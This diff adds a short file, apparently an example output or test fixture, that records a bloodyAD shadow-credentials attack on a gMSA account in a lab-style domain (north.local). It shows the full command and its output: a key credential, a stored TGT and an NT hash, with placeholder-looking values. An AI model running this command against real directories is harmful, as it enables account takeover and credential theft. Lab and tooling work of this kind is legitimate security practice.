@@ -1,0 +1,5 @@
+# Command: bloodyAD -H DC01.north.local -d north.local -u eddard.stark -k add shadowCredentials 'gmsa_svc$'
+[+] KeyCredential generated with following sha256 of RSA key: aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899
+[+] TGT stored in ccache file gmsa_svc.ccache
+
+NT: 31d6cfe0d16ae931b73c59d7e0c089c0
